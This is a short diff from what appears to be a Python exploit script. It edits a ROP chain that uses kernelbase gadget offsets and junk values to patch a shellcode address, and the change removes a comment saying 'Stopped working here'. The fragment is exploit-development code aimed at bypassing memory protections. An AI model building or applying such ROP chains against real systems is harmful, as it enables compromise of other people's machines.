@@ -67,7 +67,7 @@ def main():
     rop += pack("<L",(0x42424242)) # junk for retn 0x0008
 
 
-    # Patching Shellcode Address ## Stopped working here
+    # Patching Shellcode Address 
     rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found)
     rop += pack("<L",(0x42424242)) # junk for retn 0x0008
     rop += pack("<L",(0x42424242)) # junk for retn 0x0008
